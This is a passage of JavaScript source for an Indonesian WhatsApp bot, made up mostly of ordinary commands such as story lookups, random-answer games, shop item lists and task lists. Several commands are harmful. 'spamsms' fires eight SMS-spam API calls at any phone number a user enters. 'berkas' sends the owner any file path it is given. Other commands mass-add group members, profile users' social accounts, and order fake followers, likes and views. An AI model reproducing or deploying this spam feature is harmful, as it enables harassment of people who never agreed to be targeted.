    Manik.sendImage(m.chat, thumbnail, `${ini_txt}`, m)
    break
case prefix+'wattpadsearch':
if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
    if (args.length == 0) return reply(`Example: ${command} Tere Liye`)
    query = args.join(" ")
    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wattpadsearch?apikey=${lolkey}&query=${query}`)
    get_result = get_result.result
    ini_txt = "Wattpad Seach : \n"
    for (var x of get_result) {
        ini_txt += `Title : ${x.title}\n`
        ini_txt += `Url : ${x.url}\n`
        ini_txt += `Part : ${x.parts}\n`
        ini_txt += `Motify date : ${x.modifyDate}\n`
        ini_txt += `Create date: ${x.createDate}\n`
        ini_txt += `Coment count: ${x.commentCount}\n\n`
    }
    reply(ini_txt)
    break
case prefix+'cerpen':
if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
    get_result = await fetchJson(`https://api.lolhuman.xyz/api/cerpen?apikey=${lolkey}`)
    get_result = get_result.result
    ini_txt = `Title : ${get_result.title}\n`
    ini_txt += `Creator : ${get_result.creator}\n`
    ini_txt += `Story :\n${get_result.cerpen}`
    titid = ini_txt
   reply(titid)
    break
case prefix+'ceritahoror':
if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
    get_result = await fetchJson(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${lolkey}`)
    get_result = get_result.result
    ini_txt = `Title : ${get_result.title}\n`
    ini_txt += `Desc : ${get_result.desc}\n`
    ini_txt += `Story :\n${get_result.story}\n`
    buff = await getBuffer(get_result.thumbnail)
    Manik.sendImage(m.chat, buff, `${ini_txt}`, m)
        break
    case prefix+'bisakah':
 if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
		            db.users[m.sender].limit -= 1 // -1 limit
					bisakah = body.slice(1)
					const bisa =['BISA','Tidak Bisa','Oh tentu saja bisa dong','Udah dari lahir dia bisa kaya gitu kak 🙉','Oh tentu saja tidak bisa','Wuih bisa bisa','Ga mao jawab ah lu wibu','Tentu saja bisa eh tapi boong awokawok ','Engga engga dia ga bisa','Enggaklah','Aku ga mao jawbab 🙂','Rahasia dong','Ulangi Tod gua ga paham','Mana gua tau anjir']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					Manik.sendMessage(m.chat, { text: keh }, { quoted: m })
					break

case prefix+'kapan':
case prefix+'kapankah':
if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
		            db.users[m.sender].limit -= 1 // -1 limit
					kapankah = body.slice(1)
					const kapan =['Besok','YNTKTS','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					Manik.sendMessage(m.chat, { text: koh }, { quoted: m })
					break

					
case prefix+'apakah':
if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
		            db.users[m.sender].limit -= 1 // -1 limit
					apakah = body.slice(1)
					const apa =['iya dong jelas itu','YNTKTS','Tidak lah','Oh tentu saja tidak','Ya mana saya tau kok tanya saya','Rahasia dong','ga usah di tanya emang udah kaya gitu dia','Au ah mending mandi','Bentar aku lagi berak','Knpa emang kamu suka sama dia yak 🙀','Haha mna mungkin 😎']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					Manik.sendMessage(m.chat, { text: kah }, { quoted: m })
					break
					
case prefix+'bagaimanakah':
if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
		            db.users[m.sender].limit -= 1 // -1 limit
					bagaimanakah = body.slice(1)
					const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Gua tabok boleh ?','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan','Hah kamu tanya sama aku trus aku tanya ke siapa dong','Whahahaha ga tau 😑']
					const mana = bagai[Math.floor(Math.random() * bagai.length)]
					Manik.sendMessage(m.chat, { text: mana }, { quoted: m })
					break
					


case prefix+'goblokcek': case prefix+'jelekcek': case prefix+'rate':case prefix+'haram':case prefix+'gaycek':
case prefix+'lesbicek':case prefix+'gantengcek': case prefix+'cantikcek':case prefix+'begocek': case prefix+'suhucek':case prefix+'pintercek':
case prefix+'jagocek':case prefix+'nolepcek':case prefix+'babicek':case prefix+'bebancek':case prefix+'baikcek':
case prefix+'jahatcek':case prefix+'anjingcek':case prefix+'haramcek':case prefix+'pakboycek':
case prefix+'pakgirlcek':case prefix+'sangecek': case prefix+'bapercek':case prefix+'fakboycek':case prefix+'alimcek':case prefix+'suhucek':
case prefix+'fakgirlcek':case prefix+'kerencek':case prefix+'wibucek':case prefix+'pasarkascek':
if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
db.users[m.sender].limit -= 1 // -1 limit
cantik = body.slice(1)
const eyy =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const yn = eyy[Math.floor(Math.random() * eyy.length)]
Manik.sendMessage(m.chat, { text: yn }, { quoted: m })
break

case prefix+'readmore': case prefix+'more':
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
 if (!q.includes('|')) return  reply("Penggunaan teks| teks")
const text1 = q.substring(0, q.indexOf('|') - 0)
const text2 = q.substring(q.lastIndexOf('|') + 1)
reply( text1 + readmore + text2)
break

case prefix+'berkas':
case prefix+'pile':
if (m.isGroup) return reply (mess.private)
if (!isManik) return reply(mess.owner)
if (args.length < 1) return reply ("*Mau nyari file apa kak*")
sendfile = `${q}`
anuu = fs.readFileSync(sendfile)
Manik.sendMessage(m.chat, {document: anuu, mimetype: 'application/octet-stream', fileName: `${q}`}, {quoted:m})                  
///Manik.sendMessage(m.chat, anuu, document, {mimetype: "application/octet-stream", filename: `${q}`, quoted: m})
break 

case prefix+'getcase':
if (!isManik) return reply(mess.owner)
//if (!args.length < 1) return reply(`*Mau nyari case apa kak*`) 
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("Manik.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
await reply(`${getCase(q)}`)
break



case prefix+'getidgc':
if (!m.isGroup) return reply(mess.group)
reply (`${m.chat}`)
break
    

case prefix+'hu':
case prefix+'culik':
if (!m.isGroup) return reply(mess.group)
         if (!isManik) return reply(mess.owner)
  if (args.length < 1) return reply('_*Masukin id grupnya tolol*_')
  let pantek = []
  for (let i of groupMembers) {
      pantek.push(i.jid)
  }
  await Manik.groupParticipantsUpdate(m.chat, [pantek], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 // Manik.groupAdd(q, pantek)
  break
case prefix+'stalkig':
                    if (args.length == 0) return reply(`Example: ${command} jessnolimit`)
                    username = args[1]
                    ini_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=${lolkey}`)
                    ini_result = ini_result.result
                    ini_buffer = await getBuffer(ini_result.photo_profile)
                    ini_txt = `Username : ${ini_result.username}\n`
                    ini_txt += `Full Name : ${ini_result.fullname}\n`
                    ini_txt += `Posts : ${ini_result.posts}\n`
                    ini_txt += `Followers : ${ini_result.followers}\n`
                    ini_txt += `Following : ${ini_result.following}\n`
                    ini_txt += `Bio : ${ini_result.bio}`
                    Manik.sendMessage(m.chat, { image: ini_buffer, caption: ini_txt }, { quoted: m})
                    break
                case prefix+'stalkgithub':
                    if (args.length == 0) return reply(`Example: ${command} LoL-Human`)
                    username = args[1]
                    ini_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${username}?apikey=${lolkey}`)
                    ini_result = ini_result.result
                    ini_buffer = await getBuffer(ini_result.avatar)
                    ini_txt = `Name : ${ini_result.name}\n`
                    ini_txt += `Link : ${ini_result.url}\n`
                    ini_txt += `Public Repo : ${ini_result.public_repos}\n`
                    ini_txt += `Public Gists : ${ini_result.public_gists}\n`
                    ini_txt += `Followers : ${ini_result.followers}\n`
                    ini_txt += `Following : ${ini_result.following}\n`
                    ini_txt += `Bio : ${ini_result.bio}`
                    await Manik.sendMessage(m.chat, { image: ini_buffer, caption: ini_txt }, { quoted: m})                  
                    break
                case prefix+'stalktwitter':
                    if (args.length == 0) return reply(`Example: ${command} jokowi`)
                    username = args[1]
                    ini_result = await fetchJson(`https://api.lolhuman.xyz/api/twitter/${username}?apikey=${lolkey}`)
                    ini_result = ini_result.result
                    ini_buffer = await getBuffer(ini_result.profile_picture)
                    ini_txt = `Username : ${ini_result.screen_name}\n`
                    ini_txt += `Name : ${ini_result.name}\n`
                    ini_txt += `Tweet : ${ini_result.tweet}\n`
                    ini_txt += `Joined : ${ini_result.joined}\n`
                    ini_txt += `Followers : ${ini_result.followers}\n`
                    ini_txt += `Following : ${ini_result.following}\n`
                    ini_txt += `Like : ${ini_result.like}\n`
                    ini_txt += `Description : ${ini_result.description}`
                    await Manik.sendMessage(m.chat, { image: ini_buffer, caption: ini_txt }, { quoted: m})                  
                    break
                
                case prefix+'shortlink':
                    if (args.length == 0) return reply(`Example: ${command} https://api.lolhuman.xyz`)
                    ini_link = args[1]
                    ini_buffer = await fetchJson(`https://api.lolhuman.xyz/api/shortlink?apikey=${lolkey}&url=${ini_link}`)
                    reply(ini_buffer.result)
                    break
                case prefix+'spamsms':
                if (!isPremium && !m.key.fromMe && !isManik) return reply(mess.prem)
                    if (args.length == 0) return reply(`Example: ${command} 08303030303030`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam1?apikey=${lolkey}&nomor=${text}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam2?apikey=${lolkey}&nomor=${text}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam3?apikey=${lolkey}&nomor=${text}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam4?apikey=${lolkey}&nomor=${text}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam5?apikey=${lolkey}&nomor=${text}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam6?apikey=${lolkey}&nomor=${text}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam7?apikey=${lolkey}&nomor=${text}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam8?apikey=${lolkey}&nomor=${text}`)
                    reply("Success")
                    break
                    case prefix+'limit+': 
if (!global.db.users[m.sender].limit < 1) return reply(`S u k s e s Menambah Limit`) // respon ketika limit habis
db.users[m.sender].limit += 1
break
case prefix+'checklimit': 
reply(`Limit Kamu : *${global.db.users[m.sender].limit}*`)
break
case prefix+'react':
if (!m.quoted) throw false
let { chat, fromMe, id, isBaileys } = m.quoted
if (!text) return reply `Example : ${command} Emot Mana Kak😡`
const reactionMessage = {
    react: {
        text: `${text}`,
        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
    }
}

 Manik.sendMessage(m.chat, reactionMessage)
 break
 
        // Menu Store
        case prefix+'item':
        if (!m.isGroup) return reply(mess.group)
                    if (!m.isGroup) return reply(mess.OnlyGrup)
            if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
            if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ${groupName}`)
            var arr_rows = [];
            for (let x of db_respon_list) {
                if (x.id === from) {
                    arr_rows.push({
                        title: x.key,
                        rowId: '.pesanan ' + x.key
                    })
                }
            }
const listMessage = {
  text: `${ucapanWaktu}\nKak ${pushname} 👋\n\nBerikut Adalah List Item\nYang tersedia di Group\n*${groupName}*`,
  footer: "Lihat Di Bawah Ya Kak !",
  buttonText: "Lihat Item!",
  sections: [{
                    title: groupName, rows: arr_rows
                }],
                listType: 1
}

const sendMsg = await Manik.sendMessage(m.chat, listMessage)
               break
        
        case prefix+'tambahitem':
        if (!m.isGroup) return reply(mess.group)
            if (!m.isGroup) return reply(mess.OnlyGrup)
            if (!isAdmins && !isManik) return reply('Only Admins')
            var args1 = text.split("|")[0]
            var args2 = text.split("|")[1]                
            if (!q.includes("|")) return reply(`Gunakan dengan cara\n .${command.slice(1)} *Nama Item|Harga Produk*\n\n_Contoh_\n\n.${command.slice(1)} JASA KYC|30K`)
            if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`Produk : *${args1}* sudah ada di group ini.`)
            if (/image/.test(mime)) {
              let media = await Manik.downloadAndSaveMediaMessage(m.message.imageMessage || m.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
                const fd = new FormData();
                fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
                fetch('https://telegra.ph/upload', {
                    method: 'POST',
                    body: fd
                }).then(res => res.json())
                    .then((json) => {
                        addResponList(from, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
                        reply(`Sukses set list message dengan key : *${args1}*`)
                        if (fs.existsSync(media)) fs.unlinkSync(media)
                    })
            } else {
                addResponList(from, args1, args2, false, '-', db_respon_list)
                reply(`Sukses set list message dengan key : *${args1}*`)
            }
            break
			
			//HAPUS ITEM2
			
		case prefix+'hapusitem2':
		if (!m.isGroup) return reply(mess.group)
                    if (!m.isGroup) return reply(mess.OnlyGrup)
            if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
            if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ${groupName}`)
            var arr_rows = [];
            for (let x of db_respon_list) {
                if (x.id === from) {
                    arr_rows.push({
                        title: x.key,
                        rowId: '.hapusitem ' + x.key
                    })
                }
            }
			const listMes = {
			  text: `${ucapanWaktu}\nKak ${pushname} 👋\n\nSilahkan Pilih Item Yang Akan Di Hapus !\n`,
			  footer: "Harap tidak salah memilih !",
			  buttonText: "Lihat Item !",
			  sections: [{
								title: 'Pilih Untuk Menghapus Item !', rows: arr_rows
							}],
							listType: 1
			}

			await Manik.sendMessage(m.chat, listMes)
		break
			//HAPUS ITEM
        case prefix+'hapusitem':
        if (!m.isGroup) return reply(mess.group)
            if (!m.isGroup) return reply(mess.OnlyGrup)
            if (!isAdmins && !isManik) return reply('Only Admins')
            if (db_respon_list.length === 0) return reply(`Belum ada list item di database`)
            if (!q) return reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item*\n\n_Contoh_\n\n${command.slice(1)} JAYA KYC`)
            if (!isAlreadyResponList(from, q, db_respon_list)) return reply(`List Produk Nama *${q}* tidak ada di database!`)
            delResponList(from, q, db_respon_list)
            reply(`Sukses Menghapus Item : *${q}*`)
            break
			
		//UBAH ITEM	
        case prefix+'ubahitem': case prefix+'ubah':
            if (!m.isGroup) return reply(mess.OnlyGrup)
            if (!isAdmins && !isManik) return reply('Only Admins')
            var args1 = q.split("|")[0]
            var args2 = q.split("|")[1]
            if (!q.includes("|")) return reply(`Gunakan dengan cara ${command.slice(1)} *Nama Produk|Harga Produk*\n\n_Contoh_\n\n${command.slice(1)} JASA KYC|30K`)
            if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
            if (/image/.test(mime)) {
                let media = await Manik.downloadAndSaveMediaMessage(m.message.imageMessage || m.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
              const fd = new FormData();
                fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
                fetch('https://telegra.ph/upload', {
                    method: 'POST',
                    body: fd
                }).then(res => res.json())
                    .then((json) => {
                        updateResponList(from, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
                        reply(`Sukses update list message dengan key : *${args1}*`)
                        if (fs.existsSync(media)) fs.unlinkSync(media)
                    })
            } else {
                updateResponList(from, args1, args2, false, '-', db_respon_list)
                reply(`Sukses update respon list dengan key *${args1}*`)
            }
            break

        case prefix+'tambah':
            if (args.length < 3) return reply(`Gunakan dengan cara ${command.slice(1)} *angka* *angka*\n\n_Contoh_\n\n${command.slice(1)} 1 2`)
            var nilai_one = Number(args[1])
            var nilai_two = Number(args[2])
            reply(`${nilai_one + nilai_two}`)
            break
        case prefix+'kurang':
            if (args.length < 3) return reply(`Gunakan dengan cara ${command.slice(1)} *angka* *angka*\n\n_Contoh_\n\n${command.slice(1)} 1 2`)
            var nilai_one = Number(args[1])
            var nilai_two = Number(args[2])
            reply(`${nilai_one - nilai_two}`)
            break
        case prefix+'kali':
            if (args.length < 3) return reply(`Gunakan dengan cara ${command.slice(1)} *angka* *angka*\n\n_Contoh_\n\n${command.slice(1)} 1 2`)
            var nilai_one = Number(args[1])
            var nilai_two = Number(args[2])
            reply(`${nilai_one * nilai_two}`)
            break
        case prefix+'bagi':
            if (args.length < 3) return reply(`Gunakan dengan cara ${command.slice(1)} *angka* *angka*\n\n_Contoh_\n\n${command.slice(1)} 1 2`)
            var nilai_one = Number(args[1])
            var nilai_two = Number(args[2])
            reply(`${nilai_one / nilai_two}`)
            break
        case '.cekproses':
            if (!isGroup) return
            if (!isManik && !groupAdmins) return
            if (!m.quoted) return reply('Reply Bukti Pembayaran!!')
            if (!m.quoted.text) {
            reply('Catatannya mana?')
            }
            if (m.quoted.text) {
            let catad = m.quoted.text
            let nimb = quoted.sender
            let prses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Pending\`\`\`\n\n📝 Catatan :\n${catad}\n\nPesanan @${nimb.split("@")[0]} sedang di proses!`
            mentions(prses, [nimb], true)
            }
            break
			
			//PROSES
        case '.prosesx':
            //if (!m.isGroup) return
          //  if (!isManik && !groupAdmins) return
           // if (!m.quoted) return reply('Reply Bukti Pembayaran!!')
           // if (!text) return reply('Masukan Catatan Pelanggan\nContoh: proses 11 Diamond Ml | Id 12345678(1234)')
           let numb = m.sender
           let proses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Pending\n\n📝 ITEM : ${args[2]}\`\`\`\n\nPesanan  sedang di proses!`
           // mentions(proses, numb, true)
           // m.quoted.copyNForward(`6283155997772@s.whatsapp.net`, true)
           // Manik.sendMessage(`6283155997772@s.whatsapp.net`, {text: proses })
				await Manik.sendPesan(m.chat, proses, 0)
				await Manik.sendPesan(`${args[1]}`, proses, 0)
		 await Manik.sendPesan(m.chat,`${args[1]}\n${args[2]}`, 0)
		   
		   
            break
        case '.done':
            if (!isManik) return
            if (args.length == 1) return reply('Masukan Nomor Pelanggan\nContoh: done 62xxx|catatan')
            if (args.length == 2) return reply('Masukan Catatan Transaksi')
            if (args[1].includes('+')) return reply(`Jangan menggunakan +`)
            if (isNaN(parseInt(args[1]))) return reply('Harus Berupa Angka!')
            let numbb = `${args[1]}@s.whatsapp.net`             
            let sukses = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Berhasil\`\`\`\n\n📝 Catatan :\n${args[2]}\n\nTerimakasih @${numbb.split("@")[0]} Next Order ya🙏`
            Manik.sendMessage(`${args[1]}@s.whatsapp.net`, {text: sukses })
            break
            case prefix+'react':
                      if (!isManik) return reply('Manik Aja')
                      if (!isQuotedMsg) return reply(`Balas pesannya`)
                      if (args.length < 2) return reply(`Masukkan 1 emoji`)
                      if (!isEmoji(args[1])) return reply(`Itu bukan emoji!`)
                      if (isEmoji(args[1]).length > 1) return reply(`Satu aja emojinya`)
                      var reactMsg = { reactionMessage: {
                          key: {
                            remoteJid: m.chat,
                            fromMe: m.quotedMsg.fromMe,
                            id: m.quotedMsg.id,
                            participant: m.quotedMsg.sender
                          },
                          text: args[1]
                        }
                      }
                      Manik.sendMessageFromContent(m.chat, reactMsg)
                      break
          case prefix+'addjudultugas':
          if (args.length === 0) return reply(`Buat list dengan judul\n\nContoh : ${prefix}addjudultugas | <judul tugas>`);
          if (judullist.length > 0) return reply(`Mohon untuk reset tugas terlebih dahulu dengan command ${prefix}resettugas`);
          const isijudullist = q.split(`|`)[1];
          const judulin = judullist.push(isijudullist);
          if (judulin) return reply(`Tugas sudah ditambahkan, untuk menambahkan tugas menggunakan command ${prefix}addtugas | <nama tugas>`);
          break;
        
        case prefix+'addtugas':
          if (args.length === 0) return reply(`Tambah daftar Tugas dengan isi\n\nContoh : ${prefix}addtugas | <nama tugas>`);
          if (judullist.length === 0) return reply(`Mohon untuk membuat judul Tugas terlebih dahulu dengan command ${prefix}addjudultugas`);
          const isilist = q.split(`|`)[1];
          const isiin = daftarlist.push(isilist);
          if (isiin) {
            const isidaftar = ngelistisi();
            reply(isidaftar);
          }
          break;
        
        case prefix+'hapustugas':
          if (args.length === 0) return reply(`Hapus item pada List dengan nomor item\n\nContoh : ${prefix}hapustugas 1`);
          if (daftarlist.length === 0) return reply(`Tambah daftar tugas dengan isi\n\nContoh : ${prefix}addtugas | <nama tugas>`);
          if (judullist.length === 0) return reply(`Mohon untuk membuat judul tugas terlebih dahulu dengan command ${prefix}addjudultugas`);
          var i = args[1];
          i--;
          const hapusinlist = daftarlist.splice(i, 1);
          if (hapusinlist){
            reply(`Item dengan nomor ${args} telah dihapus !`);
            const isidaftar = ngelistisi();
            reply(isidaftar);
          }
          break;

        case prefix+'listtugas':
          if (daftarlist.length === 0) return reply(`Tambah daftar tugas dengan isi\n\nContoh : ${prefix}addtugas | <ini tugas>`);
          if (judullist.length === 0) return reply(`Mohon untuk membuat judul tugas terlebih dahulu dengan command ${prefix}addjudultugas`);
          const isidaftar = ngelistisi();
          reply(isidaftar);
          break;

        case prefix+'resettugas':
          while (daftarlist.length) { 
            daftarlist.pop(); 
          }
          while (judullist.length) { 
            judullist.pop(); 
          }
          if (daftarlist.length === 0 && judullist.length === 0) return reply(`tugas sudah di reset !`);
          break;
          case prefix+'dashboard':
	                    addCountCmd('#dashboard', sender, _cmd)
                            var posi = await getPosiCmdUser(sender, _cmdUser)
                            _cmdUser[posi].db.sort((a, b) => (a.count < b.count) ? 1 : -1)
                            _cmd.sort((a, b) => (a.count  < b.count) ? 1 : -1)
                            var posi = await getPosiCmdUser(sender, _cmdUser)
                            var jumlahCmd = _cmd.length
                            if (jumlahCmd > 10) jumlahCmd = 10
                            var jumlah = _cmdUser[posi].db.length
                            if (jumlah > 5) jumlah = 5
                            var totalUser = 0
                            for (let x of _cmdUser[posi].db) {
                              totalUser = totalUser + x.count
                            }
                            var total = 0
                            for (let o of _cmd) {
                              total = total + o.count
                            }
                            var teks = `*MANIK BOT DASHBOARD*\n\n*HIT*\n• GLOBAL : ${total}\n• USER : ${totalUser}\n\n`
                            teks += `*Most Command Global*\n`
                            for (let u = 0; u < jumlahCmd; u ++) {
                              teks += `• ${_cmd[u].nama} : ${_cmd[u].count}\n`
                            }
                            teks += `\n*Most Command User*\n`
                            for (let i = 0; i < jumlah; i ++) {
                              teks += `• ${_cmdUser[posi].db[i].nama} : ${_cmdUser[posi].db[i].count}\n`
                            }
                            reply(teks)
                            break
                            case prefix+'clearerr':
                            let eror = JSON.parse(fs.readFileSync('./error.json'))
eror.splice(0)
fs.writeFileSync('./error.json', JSON.stringify(eror))
reply`Done`
break
case prefix+'simi':{
const axios = require('axios')
          res = await axios.get(`https://api-sv2.simsimi.net/v2/?text=${text}&lc=id`)
          pp = res.data.success
          reply(res.data.success)
          break 
          }
          case prefix+'order':
			case prefix+'caraorder': {
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				let capp = `*Hallo _${m.pushName}_ Berikut Cara Order*\n\n*Followers :*\nex1 : _${prefix}followers jumlah|target [ tanpa (@) ]_\nex2 : _${prefix}followers 500|Aryamanik___\n\n*View :*\nex 1 : _${prefix}view jumlah|link_\nex 2 : _${prefix}view 10000|https://vm.tiktok.com/xxxxxxx_\n\n*Like :*\nex 1 : _${prefix}like jumlah|link_\nex 2 : _${prefix}like 10000|https://www.instagram.com/p/xxxxxxx_\n\nSekian penjelasan cara order\nSemoga anda faham dengan penjelasan ini🙏\nbeli = faham`
				Manik.sendMessage(from, {text: capp}, {quoted:m})
				}
				break
          case prefix+'followers': case prefix+'follower': {
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				if (args.length < 1) return m.reply(`Link atau Usernamenya mana?`)
				let juma = q.split('|')[0] ? q.split('|')[0]: q
				let targtt = q.split('|')[1] ? q.split('|')[1]: ''
				if (targtt.length < 1) return m.reply(`Jumlah dan Target harus di isi!\nContoh: ${prefix}${command.slice(1)} 500|aryamanik___`)

				fetaa = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=manikbot&action=pricelist&type=follower`)
				list = []
				textplus = `${juma}|${targtt}`
            for (let L of fetaa.data) {
                list.push({
                        title: `*${L.nama}*`,
    					rowId: `${prefix}confirmorderkunci ${textplus}|${L.id_layanan}`,
    					description: `\n${L.desc}`
                    })
                }
const listMessage = {
  text: `Pilih layanan sesuai dengan yang anda inginkan!\nBerikut adalah list yang bisa anda pilih, silahkan!.`,
  footer: "©AryaManik (owner bot)\nAffis Junianto (owner smm)",
  buttonText: "Click Here!",
  sections: [{
                    title: "Sosmed Store",
  				rows: list
                }],
                listType: 1
}

const sendMsg = await Manik.sendMessage(m.chat, listMessage)
               break
					}
					
			case prefix+'like':{
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				if (args.length < 1) return m.reply(`Link atau Usernamenya mana?`)
				let jumlahhh = q.split('|')[0] ? q.split('|')[0]: q
				let targettt = q.split('|')[1] ? q.split('|')[1]: ''
				if (targettt.length < 1) return m.reply(`Jumlah dan Target harus di isi!\nContoh: ${prefix}${command.slice(1)} 500|aryamanik___`)

				fetaa = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=manikbot&action=pricelist&type=like`)
				list = []
				textplus = `${jumlahhh}|${targettt}`
            for (let L of fetaa.data) {
                list.push({
                        title: `*${L.nama}*`,
    					rowId: `${prefix}confirmorderkunci ${textplus}|${L.id_layanan}`,
    					description: `\n${L.desc}`
                    })
                }
const listMessage = {
  text: `Pilih layanan sesuai dengan yang anda inginkan!\nBerikut adalah list yang bisa anda pilih, silahkan!.`,
  footer: "©AryaManik (owner bot)\nAffis Junianto (owner smm)",
  buttonText: "Click Here!",
  sections: [{
                    title: "Sosmed Store",
  				rows: list
                }],
                listType: 1
}

const sendMsg = await Manik.sendMessage(m.chat, listMessage)
				}
				break
case prefix+'view': {
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				if (args.length < 1) return m.reply(`Link atau Usernamenya mana?`)
				let jumlahh = q.split('|')[0] ? q.split('|')[0]: q
				let targett = q.split('|')[1] ? q.split('|')[1]: ''
				if (targett.length < 1) return m.reply(`Jumlah dan Target harus di isi!\nContoh: ${prefix}${command.slice(1)} 500|aryamanik___`)

				fetta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=manikbot&action=pricelist&type=view`)
				list = []
				textplus = `${jumlahh}|${targett}`
            for (let L of fetta.data) {
                list.push({
                        title: `*${L.nama}*`,
    					rowId: `${prefix}confirmorderkunci ${textplus}|${L.id_layanan}`,
    					description: `\n${L.desc}`
                    })
                }
const listMessage = {
  text: `Pilih layanan sesuai dengan yang anda inginkan!\nBerikut adalah list yang bisa anda pilih, silahkan!.`,
  footer: "©AryaManik (owner bot)\nAffis Junianto (owner smm)",
  buttonText: "Click Here!",
  sections: [{
                    title: "Sosmed Store",
  				rows: list
                }],
                listType: 1
}

const sendMsg = await Manik.sendMessage(m.chat, listMessage)
				break
}
case prefix+'confirmorderkunci': { //KUNCI = BIAR GA DIAKSES HEHE
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				if (args.length < 1) return m.reply(`*Cara order followers*\n\n*Example :* _${command} jumlah|username tanpa (@)_\n*Example :* _${command} 500|aryamanik___\n\n*Min pesan :* _300_ \n*Max pesan :* _500k_\n\nThank You`)
				let jumlah = q.split('|')[0] ? q.split('|')[0]: q
				let targ = q.split('|')[1] ? q.split('|')[1]: ''
				let idny = q.split('|')[2] ? q.split('|')[2]: ''

				feta = await fetchJson(`https://ampibismm.my.id/api/json?bot=true&api_key=manikbot&action=order&quantity=${jumlah}&target=${targ}&id_layanan=${idny}`)
				if (feta.status == false) {
  				m.reply(`*Maaf orderan gagal di buat*\n\nPermasalahan :\n${feta.data.msg} atau Cara order anda salah\n\nDiharapkan sudah faham jika ingin membeli\njika masih tidak faham silahkan ketik ${prefix}owner!\n`)
				} else {
  				let idpes = feta.data.order_id
